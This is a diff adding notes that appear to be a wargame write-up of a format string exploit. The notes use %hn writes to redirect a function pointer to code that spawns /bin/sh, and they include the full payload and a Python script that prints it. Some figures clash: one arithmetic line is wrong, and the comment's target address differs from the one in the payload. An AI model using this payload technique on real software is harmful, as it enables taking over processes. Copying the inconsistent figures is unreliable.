@@ -1,0 +1,48 @@
+Format string exploit...
+
+
+Very similar to narnia 5.
+
+The position of our input is 2 mem addresses into the stack
+
+so we can access write to our input with %2$n
+
+
+The problem this time is that we want to write a mem address and not an int...
+
+So what we do is write to the low and high order bytes of the memory address we need.
+
+
+so if our target is 0xffffd298, we add that and the address 0x2 up into our payload.
+
+so 0xffffd29a and 0xffffd298...
+
+Then we have to write the bytes we want, 0x08048724
+
+We split that into two halves, 0x0804 and 0x8724
+
+We get their integer values, 2052 and 34596, and then we write those
+  
+   low order addr  high order addr       2052-8 bytes currently written, write to high order with %2$n
+       |               |		  |
+       V               V     		  V
+\x9a\xd2\xff\xff \x98\xd2\xff\xff    %2044x%2$hn
+
+Then need integer 34596, currently have written 2052 bytes, so 34596-252=32544
+
+
+%32544x%2$hn, write to low order bytes 0x8724
+
+All together....:
+'\x9a\xd2\xff\xff\x98\xd2\xff\xff%2044x%2$hn%32544x%3$hn'
+This nets a shell bc the address of 'hacked function' that the fptr points to executes /bin/sh
+____________________________________________________________________
+#Payload that writes the desired bytes to mem address!
+payload = b'\x9a\xd2\xff\xff\x98\xd2\xff\xff%2044x%2$hn%32544x%3$hn'
+#need to write address of hackedfunction() (8048724) into address of
+#ptrf() (ffffd2a8)
+print(payload)
+____________________________________________________________________
+
+
+
